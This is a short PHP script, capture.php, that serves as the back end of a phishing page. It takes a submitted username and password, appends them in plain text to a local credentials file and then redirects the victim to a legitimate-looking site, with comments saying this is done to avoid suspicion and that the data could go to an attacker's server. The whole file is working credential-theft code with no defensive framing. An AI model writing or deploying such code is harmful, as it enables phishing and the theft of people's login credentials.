<?php
// capture.php
$username = $_POST['username'];
$password = $_POST['password'];

// Save credentials to a file or send them to an attacker's server
file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);

// Redirect to a legitimate-looking page to avoid suspicion
header("Location: https://www.example.com");
exit();
?>